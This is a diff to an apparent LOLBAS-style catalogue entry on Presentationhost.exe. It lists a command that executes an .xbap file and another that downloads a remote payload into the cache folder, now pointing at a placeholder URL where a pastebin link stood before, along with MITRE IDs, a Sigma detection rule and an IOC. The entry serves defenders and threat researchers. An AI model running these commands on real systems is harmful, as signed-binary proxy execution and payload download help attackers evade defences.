@@ -1,7 +1,7 @@
 ---
 Name: Presentationhost.exe
 Description: File is used for executing Browser applications
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
   - Command: Presentationhost.exe C:\temp\Evil.xbap
@@ -12,18 +12,16 @@ Commands:
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Commands:
-  - Command: Presentationhost.exe https://pastebin.com/raw/pnccaQCE
+  - Command: Presentationhost.exe https://example.com/payload
     Description: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
     Usecase: Downloads payload from remote server
     Category: Download
     Privileges: User
-    MitreID: T1105, T1218
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    MitreID: T1105
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\Presentationhost.exe
   - Path: C:\Windows\SysWOW64\Presentationhost.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/a38c0218765a89f5d18eadd49639c72a5d25d944/rules/windows/process_creation/win_susp_presentationhost_execution.yml
   - IOC: Execution of .xbap files may not be common on production workstations
@@ -35,4 +33,3 @@ Acknowledgement:
     Handle: '@subtee'
   - Person: Nir Chako (Pentera)
     Handle: '@C_h4ck_0'
----
